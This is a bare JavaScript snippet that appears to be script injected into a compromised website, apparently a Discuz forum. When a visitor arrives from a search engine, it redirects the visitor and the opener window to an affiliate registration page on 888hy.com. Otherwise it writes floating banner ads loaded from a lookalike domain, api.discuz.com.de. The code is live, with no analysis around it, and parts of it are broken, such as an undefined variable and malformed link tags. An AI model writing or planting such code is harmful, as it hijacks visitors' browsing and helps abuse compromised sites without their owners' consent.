if (document.cookie.indexOf('whoami') == -1) {
	var exp = new Date();
	exp.setTime(exp.getTime() + 3600000);
	document.cookie = 'whoami=1;expires=' + exp.toGMTString();
	var ref = document.referrer;
	var bot = ['baidu', 'google', 'yahoo', 'bing', 'soso', 'sogou', '360.cn', 'so.com', 'youdao', 'anquan'];
	for (var i in bot) {
		if (ref.indexOf(bot[i]) != -1) {
			if (parent.window.opener) {
				parent.window.opener.location = 'http://www.888hy.com/html/register.html?pid=211&query='
			};
			window.location.href = 'http://www.888hy.com/html/register.html?pid=211&query='
		}
	}
} else {
	document.write("<div id='Left' style='position:absolute;visibility:visible;z-index:999;line-height:2%'><i href='http://www.888hy.com/html/register.html?pid=211' target='_blank'><img src='http://api.discuz.com.de/Img/Left-1.gif' width='130' height='240' border='0'></i><br><br><i href='http://www.888hy.com/html/register.html?pid=211' target='_blank'><img src='http://api.discuz.com.de/Img/Left-2.gif' width='130' height='130' border='0'></i></div>");
	document.write("<div id='Right' style='position:absolute;visibility:visible;z-index:999;line-height:2%'><i href='http://www.888hy.com/html/register.html?pid=211' target='_blank'><img src='http://api.discuz.com.de/Img/Right-1.gif' width='130' height='240' border='0'></i><br><br><i href='http://www.888hy.com/html/register.html?pid=211' target='_blank'><img src='http://api.discuz.com.de/Img/Right-2.gif' width='130' height='130' border='0'></i></div>");
	function whoami() {
		if (!document.ns) {
			var top = document.body.scrollTop;
			if (top == 0) {
				top = document.z.scrollTop
			};
			document.getElementById('Left').style.top = top + i + 'px';
			document.getElementById('Left').style.left = document.body.scrollLeft + 8 + 'px';
			document.getElementById('Right').style.top = top + i + 'px';
			document.getElementById('Right').style.right = document.body.scrollLeft + 8 + 'px'
		};
		setTimeout('whoami();', 200)
	};
	whoami()
}